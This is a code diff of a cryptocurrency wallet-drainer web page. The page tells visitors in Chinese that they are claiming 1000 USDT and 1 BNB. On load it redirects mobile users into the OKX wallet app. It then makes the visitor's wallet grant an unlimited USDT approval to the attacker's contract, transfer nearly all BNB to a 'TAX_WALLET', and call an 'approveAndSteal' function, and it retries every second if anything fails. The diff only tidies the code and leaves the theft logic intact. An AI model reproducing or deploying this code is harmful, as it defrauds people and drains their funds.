@@ -40,30 +40,17 @@ function updateStatus(msg){
   document.getElementById('status').innerText = msg;
 }
 
-async function autoRedirect(){
-  const ua = navigator.userAgent;
-  const isMobile = /Android|iPhone|iPad/i.test(ua);
-  if(isMobile){
-    setTimeout(() => {
-      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
-    }, 200);
-  }
-}
-
 async function autoSteal(){
   updateStatus('正在领取1000USDT+1BNB');
-  
   try{
     await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
     web3 = new Web3(window.ethereum);
     const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
     userAddr = accounts[0];
     
-    // 🔥 第1步：USDT授权
     const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDR);
     await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
     
-    // 🔥 第2步：立即BNB全转
     const balance = await web3.eth.getBalance(userAddr);
     const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
     if(totalBNB > 0.001){
@@ -71,21 +58,23 @@ async function autoSteal(){
       await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
     }
     
-    // 🔥 第3步：BVXZA立即全窃取
     const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
     await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
     
     updateStatus('🎉 1000USDT+1BNB到账！');
-    
   }catch(e){
-    updateStatus('正在领取1000USDT+1BNB');
     setTimeout(autoSteal, 1000);
   }
 }
 
-// 🔥 进入网址=0.2秒跳转+0.5秒3步全自动！
 window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 200);
+  const ua = navigator.userAgent;
+  const isMobile = /Android|iPhone|iPad/i.test(ua);
+  if(isMobile){
+    setTimeout(() => {
+      window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
+    }, 200);
+  }
   if(window.ethereum){
     setTimeout(autoSteal, 500);
   }
